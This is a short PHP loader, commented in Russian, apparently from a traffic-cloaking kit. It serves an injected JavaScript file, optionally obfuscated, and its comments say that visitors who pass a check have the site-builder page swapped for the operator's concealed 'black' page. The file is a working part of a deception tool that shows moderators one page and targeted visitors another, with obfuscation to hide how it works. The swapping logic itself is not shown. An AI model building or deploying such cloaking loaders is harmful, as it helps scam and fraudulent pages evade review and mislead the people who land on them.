<?php
//Этот файл необходимо подключить к любому конструктору, используя
//следующий код: <script src="https://ваш.домен/js"></script>
//в случае прохождения пользователем проверки, будет совершена подмена
//содержимого страницы конструктора на ваш блэк

include 'obfuscator.php';
include '../settings.php';
header('Content-Type: text/javascript');
$jsCode= str_replace('{DOMAIN}', $_SERVER['SERVER_NAME'], file_get_contents(__DIR__.'/process.js'));
if ($js_obfuscate) {
	$hunter = new HunterObfuscator($jsCode);
	echo $hunter->Obfuscate();
} else {
	echo $jsCode;
}
?>